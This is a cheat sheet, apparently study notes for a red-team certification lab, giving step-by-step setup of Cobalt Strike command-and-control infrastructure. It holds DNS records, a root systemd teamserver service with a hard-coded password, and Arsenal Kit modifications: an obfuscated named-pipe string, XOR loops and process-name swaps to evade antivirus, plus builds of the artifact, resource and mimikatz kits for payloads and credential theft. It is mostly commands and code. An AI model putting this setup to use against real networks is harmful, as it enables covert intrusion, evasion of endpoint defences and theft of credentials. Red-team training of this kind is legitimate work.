# CRTO Infrastructure Cheat Sheet

1. Setup DNS records
2. Load Malleable C2 profile and change out https-certificate block (use nopsled.profile which is custom webbug.profile)
3. Setup teamserver.service enabled on boot
4. Create http, smb, dns, tcp, tcp-local listeners
5. Modify the script_template.cna (changes rundll32.exe references to dllhost.exe)
6. Modify bypass-pipe.c and patch.c, and build the artifact kit
7. Modify the template.x64.ps1 file and build the resource kit
8. Build the mimikatz kit
9. Load all the cna files (e.g., artifact.cna, resource.cna, mimikatz.cna)
10. Generate all Windows stageless CS payloads


## 1. Set DNS records

@ A 3600 10.10.5.50
ns1 A 3600 10.10.5.50
pics A 3600 ns1.getwrecked.com

## 2. Load Malleable C2 profile

- Use nopsled.profile (custom webbug.profile)
- Change out the CN to match DNS in https-certificate

## 3. Setup Team Server as a Service

`sudo vim /etc/systemd/system/teamserver.service`

*include in teamserver.service:*
```[Unit]
Description=Cobalt Strike Team Server
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
Restart=always
RestartSec=1
User=root
WorkingDirectory=/home/attacker/cobaltstrike
ExecStart=/home/attacker/cobaltstrike/teamserver 10.10.5.50 Passw0rd! c2-profiles/normal/nopsled.profile

[Install]
WantedBy=multi-user.target
```

Setup the service to enable on boot after creating teamserver.service
`sudo systemctl daemon-reload`
`sudo systemctl status teamserver.service`
`sudo systemctl start teamserver.service`
`sudo systemctl enable teamserver.service`

## 4. Create http, smb, dns, tcp, tcp-local listeners

## 5. Modify the script_template.cna (changes rundll32.exe references to dllhost.exe)
`$template_path="C:\Tools\cobaltstrike\arsenal-kit\kits\artifact\script_template.cna"; (Get-Content -Path $template_path) -replace 'rundll32.exe', 'dllhost.exe' | Set-Content -Path $template_path`

## 6. Modify bypass-pipe.c and patch.c, and build the artifact kit

### bypass-pipe.c: Change the sprintf call on line 130 and remove the comments above
`sprintf(pipename, "%c%c%c%c%c%c%c%c%cnop\\sled", 92, 92, 46, 92, 112, 105, 112, 101, 92);`

### patch.c: Change for loops on lines 45 and around 115/120
```
for (x = 0; x < length; x++) {
    char* ptr = (char *)buffer + x;

    /* do something random */
    GetTickCount();

    *ptr = *ptr ^ key[x % 8];
}
```

### Build artifact kit
`cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact && ./build.sh pipe VirtualAlloc 310272 5 false false none /mnt/c/Tools/cobaltstrike/artifacts`

## 7. Modify the template.x64.ps1 file and build the resource kit

### Edit template.x64.ps1
```
for ($nops = 0; $nops -lt $v_code.Count; $nops++) {
	$v_code[$nops] = $v_code[$nops] -bxor 35
}
```

### Build resource kit
`cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/resource && ./build.sh /mnt/c/Tools/cobaltstrike/resource`

## 8. Build the mimikatz kit

### Setup mimikatz for CS
`cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/mimikatz/ && ./build.sh /mnt/c/Tools/cobaltstrike/mimikatz`

## 9. Load all the cna files (e.g., artifact.cna, resource.cna, mimikatz.cna)

## 10. Generate all Windows stageless CS payloads
